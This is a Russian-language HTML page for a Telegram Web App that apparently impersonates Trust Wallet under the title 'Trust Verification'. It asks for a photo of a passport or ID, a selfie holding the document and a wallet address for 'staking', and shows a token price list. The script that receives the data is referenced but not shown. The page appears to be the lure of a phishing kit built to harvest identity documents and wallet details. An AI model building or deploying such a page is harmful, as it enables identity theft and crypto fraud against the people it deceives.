<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Trust Verification</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="app-container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Trust_Wallet_logo_%282026%29.png" alt="Logo" class="logo">
        </div>
        
        <div class="card">
            <h3 class="card-title">Верификация личности</h3>
            <div class="input-group">
                <label class="label">Документ (ID / Паспорт)</label>
                <div class="file-upload-wrapper">
                    <input type="file" id="docInput" accept="image/*">
                    <div class="file-custom">Выбрать фото</div>
                </div>
            </div>
            <div class="input-group">
                <label class="label">Селфи с документом</label>
                <div class="file-upload-wrapper">
                    <input type="file" id="selfieInput" accept="image/*">
                    <div class="file-custom">Сделать фото</div>
                </div>
            </div>
            <button id="verifyBtn" class="btn btn-primary">Отправить данные</button>
        </div>

        <div class="card">
            <h3 class="card-title">Стейкинг активов</h3>
            <div class="input-group">
                <input type="text" id="walletInput" placeholder="Адрес кошелька (0x...)" class="text-input">
            </div>
            <button id="stakingBtn" class="btn btn-outline">Подключить кошелек</button>
        </div>

        <div class="card tokens-card">
            <div class="tokens-tabs">
                <span class="tab active">Top</span>
                <span class="tab">BNB</span>
                <span class="tab">ETH</span>
                <span class="tab">SOL</span>
            </div>
            <div id="tokensList" class="tokens-list">
                <div class="loading">Загрузка котировок...</div>
            </div>
        </div>

        <div id="status" class="status-toast hidden"></div>
    </div>
    <script src="script.js"></script>
</body>
</html>
